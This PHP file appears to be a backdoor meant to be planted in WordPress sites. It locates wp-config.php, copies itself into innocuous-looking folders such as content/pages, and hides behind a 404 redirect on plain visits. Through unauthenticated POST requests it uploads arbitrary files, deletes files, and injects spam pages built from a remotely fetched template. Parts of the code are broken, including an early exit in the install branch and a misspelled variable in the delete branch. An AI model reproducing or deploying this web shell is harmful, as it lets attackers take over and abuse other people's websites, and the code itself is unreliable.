<?php
define(VERSION, 'v1');

header('Access-Control-Allow-Origin: *');
//header('Content-Type: application/json');



function a($x,$y){
    return in_array($x,$y);
}


if(array_keys($_GET)[0] && array_keys($_GET)[0] == 'init' ){

    $dirs;
    do {
        $dirs = scandir(getcwd());
        if(a('wp-config.php',$dirs)){
        break;
        }
        else {
            chdir('../');
        }
    
    } while(!a('wp-config.php',$dirs));

    
    //$path = 'content/pages/';

    $path = array("content/pages", "contents/pages", "contents/posts", "pages/content","posts/content");
    $script_path = $path[0];

    for($i = 0; $i < count($path); $i++ ){
        if(!a(explode("/", $path)[0])){
            $script_path = $path[i];
            break;
        }
    }

    echo $script_path;
    exit;

    if(!a('content', $dirs)){
        
        $t = mkdir($path, 0777, true);
        
        if($t){
        
            if(copy(__FILE__, $path.'index.php')){
                echo ($path."index.php");
                exit;
            }
            else {
                echo ("error. cannot set the script");
                exit;
            }
        }
        else {
            echo ("error. cannot create dirs");
            exit;
        }
    }
    echo (ltrim($path,".")."index.php");
    exit;
}
elseif(array_keys($_GET)[0] && array_keys($_GET)[0] !== 'init'){
    //for checking if script still exists
    echo VERSION;
    exit;
}
else {

    //POST REQUEST PART
    function getClosingTag($tag){
        return "<\/".substr($tag, 1, stripos($tag, " ")-1).">";
    }
    
    function sanitizePageUrl($url){
        return strtolower(str_replace(array(" ", "."), "-", str_replace(array('.html', '.php','.com'),"", $url)));
    }
    
    function get_page($url){
        
        $ch1 = curl_init ();
        curl_setopt ($ch1, CURLOPT_URL,$url);
        curl_setopt ($ch1, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt ($ch1, CURLOPT_TIMEOUT, 1000);
        curl_setopt ($ch1, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt ($ch1, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)");
        $results = curl_exec ($ch1);
        curl_close($ch1);
    
        return $results;
    }
    
    //print_r($_FILES); exit;
    
    /* echo getenv('REQUEST_METHOD');
    exit; */
    
    if(getenv('REQUEST_METHOD') == 'GET'){
        header('Location: /404');
        //exit;
    }
    
    $d = file_get_contents('php://input');

    /* print_r($_POST);
    exit; */

    /* if($_FILES['uplFile']){
        echo 'upload process';
    }
    else {
        'wrong';
    }

    exit; */

    if($d == false && isset($_POST['a']) == false)
        die(json_encode('thanks'));
    
/*     echo ($d['a']);
    exit; */
    
    $d = json_decode($d, true);
    

    if($_POST['a'] && $_POST['a' ] == 'upl' ){

        $uplF = "";

        $uplD = "./";
        $uplF = $uplD . basename($_FILES['uplFile']['name']);
        if(move_uploaded_file($_FILES['uplFile']['tmp_name'], $uplF)){
            //echo 'upload ok ';
            echo $uplF;

        }
        else {
            echo 'error. fail to upload';
        }
        exit;
    }

    if($d['a'] && $d['a'] == rm){
        $postname = basename($d['page_url']);
        $dirs = scandir(getcwd());
        if(a($postname,$dirs)){
            unlink($postName);
            $result = array();
            $result['action'] = "Remove Post";
            $result['result'] = "Success";
            
            echo json_encode($result);
            exit;
        }
            
            $result = array();
            $result['action'] = "Remove Post";
            $result['result'] = "Error. No Such Post";
            
            echo json_encode($result);
            exit;
    }
    
    

    if(!$d['template_url'] || $d['template_url'] == ""){
        die('miss');
    }
    
    
    
    
    $filename = sanitizePageUrl($d['page_url']).'.html';
    
    $posts = scandir(getcwd());
    if(a($filename,$posts) && $d['or'] == 0){
        //posts exists and override set to 0 (No)
        echo ('{"result": "Error. Post exists","action":"Upload Post" }');
        exit;
    }
    
    $html = get_page($d['template_url']);
    
    
    $tagInput = $d['tag'];
    $tag = '#'.$tagInput.'(.*?)'.getClosingTag($tagInput).'#is';
    


    
    preg_match($tag, $html, $matches1);
    
   /*  print_r($matches1);
    exit; */

    
    $title = '#<title>(.*?)</title>#is';
    preg_match($title, $html, $matches);
    //print_r($matches);exit;
    
    //$html1 = preg_replace($matches[1], $d['title'], $html);
    $html = str_replace($matches[1], $d['title'], $html);
    $html = str_replace($matches1[1], $d['content'], $html);
    
    $nFile = @fopen($filename, "w");
    @fwrite($nFile, $html);
    @fclose($nFile);
    
    $result = array();
    
    $result['action'] = "Upload Post";
    $result['result'] = 'Success';
    $result['PostURL'] = $_SERVER['SCRIPT_URI'].$filename;
    $result['PostURL'] = str_replace(basename($_SERVER['SCRIPT_URI']),"", $result['PostURL']);
    
    echo json_encode($result);    
}




?>